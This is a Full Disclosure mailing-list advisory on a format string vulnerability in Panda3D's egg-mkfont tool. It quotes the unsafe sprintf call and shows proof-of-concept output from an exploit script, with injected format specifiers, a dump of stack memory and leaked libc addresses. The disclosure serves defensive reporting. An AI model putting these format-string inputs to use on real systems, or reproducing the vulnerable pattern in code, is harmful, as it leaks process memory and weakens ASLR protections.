---
title: Panda3d v1.10.16 Uncontrolled Format String in Panda3D egg-mkfont Allows Stack Memory Disclosure
url: https://seclists.org/fulldisclosure/2026/Jan/11
source: Full Disclosure
date: 2026-01-06
fetch_date: 2026-01-07T03:30:40.100006
---

# Panda3d v1.10.16 Uncontrolled Format String in Panda3D egg-mkfont Allows Stack Memory Disclosure

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# Panda3d v1.10.16 Uncontrolled Format String in Panda3D egg-mkfont Allows Stack Memory Disclosure

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Thu, 1 Jan 2026 14:35:16 -0500

---

```
Panda3D’s egg-mkfont utility contains an uncontrolled format string
vulnerability that allows disclosure of stack-resident memory. The -gp
(glyph pattern) command-line option allows users to specify a formatting
pattern intended for generating glyph texture filenames. This pattern is
passed directly as the format string to sprintf() without validation or
sanitization. If the supplied pattern contains additional format specifiers
beyond the expected numeric placeholder (e.g., %d), sprintf() will read
unintended values from the stack. The resulting formatted output is written
into attacker-accessible files, including generated .egg and .png files. As
a result, stack memory contents and pointer-sized values may be disclosed
to an attacker.
Root Cause Analysis:

The vulnerability originates from the following code in eggMakeFont.cxx:

char buffer[1024];sprintf(buffer, _output_glyph_pattern.c_str(), character);

   -

   _output_glyph_pattern is populated directly from user input via the -gp
   option.
   -

   The user-supplied string is used as the format string to sprintf().
   -

   Only a single argument (character) is provided, regardless of how many
   format specifiers are present.
   -

   When additional format specifiers (e.g., %p, %x, %n$p) are included,
   sprintf() reads unintended stack values.

Impact:

An attacker with the ability to invoke egg-mkfont can:

   -

   Read stack-resident memory values
   -

   Leak pointer-sized values, including addresses
   -

   Reduce the effectiveness of ASLR
   -

   Extract sensitive process memory via generated output files

Proof of Concept:

The following example demonstrates disclosure of stack memory via injected
format specifiers:

python3 info-leak.py

======================================================================
DUMPING ALL READABLE STRINGS FROM MEMORY
======================================================================

[*] Reading strings from stack positions 1-50...
[Param  2] <Comment> {
[Param  2]   "egg-mkfont -o /tmp/s2.egg -gp '%2$s%d'
/usr/share/fonts/truetype/de
[Param  2] <Texture> "
[Param  2]   <Scalar> format { alpha }
[Param  2]   <Scalar> minfilter { linear_mipmap_linear }
[Param  2]   <Scalar> magfilter { linear_mipmap_linear }
[Param  2]   <Scalar> anisotropic-degree { 0 }
[Param  2]   <Scalar> quality-level { best }
[Param  2]   <Transform> {
[Param  2]     <Matrix3> {
[Param  2]       0.0369977678571429 0 0
[Param  2]       0 0.16015625 0
[Param  2]       0.154352678571429 0.84375 1
[Param  2]       0.0604806673728814 0 0
[Param  2]       0 0.1328125 0
[Param  2]       0.826204978813559 0.74609375 1
[Param  2]       0.0565696022727273 0 0
[Param  2]       0 0.054375 0
[Param  2]       0.0898792613636364 0.46109375 1
[Param  2]       0.0153245192307692 0 0
[Param  2]       0 0.0935763888888889 0
[Param  2]       0.201322115384615 0.636805555555556 1
[Param  2]       0 0.12890625 0
[Param  2]       0.679723011363636 0.62109375 1
[Param  2]       0.0350378787878788 0 0
[Param  2]       0 0.0504415760869565 0
[Param  2]       0.255918560606061 0.465013586956522 1
[Param  2]       0.048828125 0 0
[Param  2]       0 0.02734375 0
[Param  2]       0.232421875 0.4453125 1
[Param  2]       0.046875 0 0
[Param  2]       0 0.13671875 0
[Param  2]       0.783203125 0.8671875 1
[Param  2]       0.0252207880434783 0 0
[Param  2]       0 0.152239583333333 0
[Param  2]       0.388756793478261 0.851614583333333 1
[Param  2]       0.0467881944444445 0 0
[Param  2]       0.466840277777778 0.734375 1
[Param  2]       0 0.10546875 0
[Param  2]       0.365277777777778 0.51171875 1

--snip--

[+] Leaked 5970 addresses!

[LEAK]  Param  1: 0xffffff860000003f - Stack-resident pointer-sized value
[LEAK]  Param  1: 0xffffff860000003e - Stack-resident pointer-sized value
[LEAK]  Param 29: 0xfffff68200008217 - Pointer within libc mapping
[LIBC]  Param 29: 0xfffff6628a340 - libc+0x8a340

--snip--
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](4)

### Current thread:

* **Panda3d v1.10.16 Uncontrolled Format String in Panda3D egg-mkfont Allows Stack Memory Disclosure** *Ron E (Jan 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")